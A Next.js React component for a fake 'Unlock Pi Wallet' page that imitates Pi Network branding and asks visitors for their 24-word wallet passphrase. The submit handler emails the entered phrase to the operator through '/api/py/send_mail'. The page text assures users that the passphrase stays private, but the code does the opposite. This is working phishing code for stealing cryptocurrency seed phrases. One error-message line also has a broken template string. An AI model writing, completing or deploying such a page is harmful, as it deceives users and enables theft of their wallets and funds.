"use client";
import Image from "next/image";
import { useState } from "react";
import toast, { Toaster } from "react-hot-toast";

const UnlockPiWallet = () => {
  const [passphrase, setPassphrase] = useState("");

  // ✅ Regular Expression for exactly 24 words
  const passphraseRegex = /^(\S+\s+){23}\S+$/;

  // Function to handle input change
  const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setPassphrase(e.target.value);
  };
  const handleSubmit = async () => {
    const words = passphrase.trim();

    if (!passphraseRegex.test(words)) {
      toast.error("❌ Invalid passphrase! Please enter exactly 24 words.");
      return;
    }

    try {
      const response = await fetch("/api/py/send_mail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          body: words, // Using passphrase as email body content
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.detail || "Failed to send email");
      }

      const data = await response.json();
      toast.success("✅ Email sent successfully!");
      setPassphrase("");
    } catch (error: any) {
      toast.error(❌ Email sending failed: ${error.message});
      console.error("Submission error:", error);
    }
  };
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white px-4 py-10 text-center">
      <Toaster position="top-center" />
      <div className="fixed top-0 w-full h-9 bg-[#703D92] grid place-content-center">
        <span className="text-white font-bold flex items-center">
          Wallet
          <Image src="/pi_logo.png" alt="Pi Logo" width={30} height={30} />
        </span>
      </div>
      <h2 className="text-2xl font-semibold mb-4">Unlock Pi Wallet</h2>

      <textarea
        className="w-full md:w-2/6 lg:w-1/2 h-40 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 text-black"
        placeholder="Enter your 24-word passphrase here"
        value={passphrase}
        onChange={handleChange}
      />

      <div className="w-full md:w-2/3 lg:w-1/2 mt-4">
        <button
          onClick={handleSubmit}
          className="w-full border-2 bg-white py-3 rounded-lg text-lg font-medium hover:text-white hover:bg-[#703D92] transition"
        >
          Unlock With Passphrase
        </button>

        <button className="w-full mt-4 border-2 bg-[#703D92] text-white py-3 rounded-lg text-lg font-medium transition">
          Unlock With Fingerprint
        </button>
      </div>

      <p className="mt-6 text-sm text-gray-600 max-w-md">
        As a non-custodial wallet, your wallet passphrase is exclusively
        accessible only to you. Recovery of passphrase is currently impossible.
      </p>
      <p className="text-sm text-gray-600">
        Lost your passphrase?{" "}
        <a href="#" className="text-blue-500 hover:underline">
          You can create a new wallet
        </a>
        , but all your π in your previous wallet will be inaccessible.
      </p>
    </div>
  );
};

export default UnlockPiWallet;
